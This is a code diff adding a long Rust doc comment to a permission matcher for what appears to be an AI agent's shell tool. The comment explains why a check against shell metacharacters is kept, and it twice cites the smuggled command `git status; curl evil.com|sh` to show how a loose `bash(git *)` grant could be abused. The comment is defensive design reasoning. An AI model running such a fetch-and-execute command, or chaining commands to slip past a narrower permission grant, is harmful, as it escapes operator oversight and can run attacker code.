@@ -80,6 +80,52 @@ impl ArgMatcher {
     /// `bash(git *)` -- read by an operator as "may run git commands" --
     /// silently also authorizes `git status; curl evil.com|sh`, because a
     /// raw `globset::Glob`'s `*` matches shell metacharacters too.
+    ///
+    /// **Board item `01M03222QS0WQWPEHHNP9FKVXJ`, Edge 1: determined and
+    /// KEPT, not removed, despite being the same hazard class GP-13
+    /// names.** `conway_core::permission_pattern::Rule::gate_allows`
+    /// removed the durable pattern-grant version of this exact scan
+    /// (`01KZDDPC5MMD49F6JPV9CW4TVM`); this one-shot version was
+    /// deliberately left for that item to re-examine, and the finding is:
+    ///
+    /// - **Removing it would WIDEN authorization, which this item's own
+    ///   hard rule forbids.** `value` here is the AGENT's rendered command
+    ///   text, not the operator's typed glob -- exactly the doc paragraph
+    ///   above: a raw `globset::Glob`'s `*` matches `;`/`|`/backtick/etc,
+    ///   so `bash(git *)` would silently also authorize `git status; curl
+    ///   evil.com|sh` the moment this check is gone. The durable gate could
+    ///   be removed outright because NO pattern grant exists for
+    ///   `ShellCommand` any more there; this gate still offers a scoped
+    ///   `tool_name(pattern)` grant for `bash`, so there is something left
+    ///   for the scan to protect and nothing to fall back to if it goes.
+    /// - **It DOES occasionally refuse a call the operator's own glob would
+    ///   otherwise cover** -- e.g. `bash(git *)` refuses `git log | head`
+    ///   even though the raw glob `git *` matches that string trivially.
+    ///   That is a real false positive, the same SHAPE GP-13 measured at a
+    ///   68% rate. What differs is the CONSEQUENCE, not the mechanism:
+    ///   - **No accumulating fatigue.** GP-13's failure mode is a durable
+    ///     rule enduring months of false positives until "the people
+    ///     relying on it turn it off" -- widening the STORED grant to route
+    ///     around the noise. A `-p`/`--allowed-tools` invocation is
+    ///     one-shot and re-typed every time; there is no persisted rule to
+    ///     wear down, so this failure mode cannot develop here.
+    ///   - **Same principal, same moment.** The person the false positive
+    ///     inconveniences is the person who wrote the glob, in the same
+    ///     breath they wrote it -- not an operator relying, weeks later, on
+    ///     a grant someone else (or their past self) authored into a
+    ///     `permissions.json` file. There is no gap for the refusal to be
+    ///     surprising in.
+    ///   - **An explicit escape hatch exists.** The bare `tool_name` form
+    ///     (`--allowed-tools bash`, no parens) is `ArgMatcher::Any` and is
+    ///     never gated by this check at all (see this struct's own doc,
+    ///     just below) -- an operator who wants zero friction can grant the
+    ///     bare form; `tool_name(pattern)` is the OPT-IN, narrower shape,
+    ///     and this scan is the reason it is narrower than a raw glob would
+    ///     otherwise make it.
+    ///
+    /// **Outcome: left unchanged.** This is the reasoning to record as the
+    /// decision for Edge 1 -- see this item's own completion report for the
+    /// board-recorded form.
     fn allows(&self, value: &str, render_kind: RenderKind) -> bool {
         match self {
             ArgMatcher::Any => true,
